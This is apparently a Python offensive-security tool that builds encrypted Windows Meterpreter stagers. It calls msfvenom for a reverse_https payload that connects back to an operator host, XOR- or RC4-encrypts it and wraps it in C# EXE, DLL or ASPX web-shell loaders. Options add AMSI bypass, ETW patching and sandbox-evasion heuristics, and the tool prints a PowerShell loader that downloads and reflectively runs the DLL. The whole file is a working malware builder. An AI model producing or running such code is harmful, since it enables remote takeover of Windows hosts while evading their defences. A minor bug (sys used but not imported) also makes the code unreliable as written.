#!/bin/env python3
import ak
import os
import re
import random
import subprocess
import argparse

MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"

# TODO: Make dynamic
XOR_KEY = b'\x09'
RC4_KEY = b'aaaaaaaaaaaaaaaa'

# Randomize namespace and entrypoint names
WORDS = open("/usr/share/dict/words").read().splitlines()
CS_NAMESPACE = re.sub(r'\W+', '', random.choice(WORDS))
CS_CLASSNAME = "Class1"
CS_ENTRY_DLL = re.sub(r'\W+', '', random.choice(WORDS))

templates = {
  'cs': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace {cs_namespace}
{{
    public class {cs_classname}
    {{
    {imports}
        public static void {cs_entry}()
        {{
        {main_code}
        }}

    }}
}}
""",
  'aspx': """
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    {imports}
    protected void Page_Load(object sender, EventArgs e)
    {{
    {main_code}
    }}
</script>
  """
}

class Stager:
  def __init__(self,args):
    self.args = args
    self.encrypt = args.encrypt

    self.shellcode_fn = self.args.output + '.sc'

    if args.format == "dll":
      self.compiled = True
      self.source_fn = self.args.output + ".cs"
      self.compiled_fn = self.args.output + ".dll"
      self.cs_entrypoint = CS_ENTRY_DLL
      self.cs_namespace = CS_NAMESPACE
      self.cs_classname = CS_CLASSNAME
      self.compile_flags = f"/target:library -out:{self.compiled_fn}"
    elif args.format == "exe":
      self.compiled = True
      self.source_fn = self.args.output + ".cs"
      self.compiled_fn = self.args.output + ".exe"
      self.cs_entrypoint = "Main"
      self.cs_namespace = CS_NAMESPACE
      self.cs_classname = CS_CLASSNAME
      self.compile_flags = f"-out:{self.compiled_fn}"
    elif args.format == "aspx":
      self.compiled = False
      self.source_fn = self.args.output + ".aspx"
      self.compiled_fn = self.source_fn
    else:
      print("Unknown format. Exiting")
      sys.exit(1)

    self.generate_shellcode()

    # Only staged needs to be written to disk
    if not self.args.stageless:
      self.save_shellcode_to_file()

  def generate_shellcode(self):
    print(f"Generating shellcode with: {MSFVENOM_CMD}")
    if self.encrypt == 'xor':
      self.shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
    elif self.encrypt == 'rc4':
      self.shellcode = ak.ShellCode(MSFVENOM_CMD, rc4_key=RC4_KEY)

  def generate_source(self):
    url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
    
    # Create obfuscator for loaders that need obfuscation
    exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
    path_obfuscated = ak.Obfuscator(exe_path, XOR_KEY)

    imports = f"""{ak.ARCH_DETECTION}"""

    # Add staged or stageless code
    if self.args.stageless and self.shellcode is not None:
      # Stageless
      main_code = ak.SC_HARDCODED.format(enc_shellcode=self.shellcode.get_hex_csharp())
    else:
      # Staged
      main_code = f"""{url_dl_code}"""

    if self.encrypt == 'xor':
      main_code += ak.SC_XOR_DECODER.format(enc_key=self.shellcode.get_key_csharp())
    elif self.encrypt == 'rc4':
      imports += ak.RC4_DECRYPT_IMPORT
      main_code += ak.SC_RC4_DECODER.format(enc_key=self.shellcode.get_key_ascii())
    else:
      print("Invalid encryption format")
      sys.exit()

    if self.args.heuristics:
      imports += f"{ak.HEURISTICS_IMPORT}"
      main_code += f"{ak.HEURISTICS_CODE}"

    if self.args.etw:
      imports += f"{ak.ETW_FUNCS}"
      main_code += f"{ak.ETW_PATCH}"

    if self.args.amsi:
      imports += f"{ak.AMSI_BYPASS_IMPORT}"
      main_code += f"{ak.AMSI_BYPASS_CODE}"

    # Add loader type
    imports += ak.import_choices[self.args.injection]
    main_code += ak.main_choices[self.args.injection].format(ak=ak,
                                                        xor_path=path_obfuscated.get_hex_csharp(),
                                                        xor_key=path_obfuscated.get_key_csharp())

    # Make csharp template
    if self.args.format == "aspx":
      template = templates["aspx"].format(imports=imports,
                                               main_code=main_code,
                                               cs_namespace=CS_NAMESPACE,
                                               cs_classname=CS_CLASSNAME)

      # Must specify full namespace for DllImport
      template = template.replace("DllImport","System.Runtime.InteropServices.DllImport")

      ak.write_file(self.source_fn, template)

    else:
      template = templates["cs"].format(imports=imports,
                                               main_code=main_code,
                                               cs_namespace=CS_NAMESPACE,
                                               cs_classname=CS_CLASSNAME,
                                               cs_entry=self.cs_entrypoint)
      ak.write_file(self.source_fn, template)

  def run(self):
    self.generate_source()
    
    if self.compiled:
      print("Compiling...")
      ak.cs_compile(self.source_fn, flags=self.compile_flags)
      print(f"Compiled {self.compiled_fn}")

      self.print_ps_loader()

  def save_shellcode_to_file(self):
    ak.write_file(self.shellcode_fn, self.shellcode.get_bytes())

  def print_ps_loader(self):
    t = ak.PS_REFLECTIVE_WEBCLIENT.format(LHOST=ak.LHOST,
                                          tool=self.compiled_fn,
                                          entrypoint=self.cs_entrypoint,
                                          tool_namespace=self.cs_namespace,
                                          tool_classname=self.cs_classname,
                                          cmd="")

    if self.args.format == 'dll':
        print("Load with:")
        print(t)


def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('--injection', '-i', default='standard', choices=ak.main_choices.keys())
  parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll', 'aspx'])
  parser.add_argument('--encrypt', '-e', default='xor', choices=['xor', 'rc4'])
  parser.add_argument('--heuristics', default=True, action='store_true')
  parser.add_argument('--amsi', default=False, action='store_true')
  parser.add_argument('--etw', default=True, action='store_true')
  parser.add_argument('--stageless', default=False, action='store_true')
  parser.add_argument('--output', '-o', default="win_msf_stager")


  args = parser.parse_args()

  s = Stager(args)

  s.run()


if __name__ == "__main__":
  main()
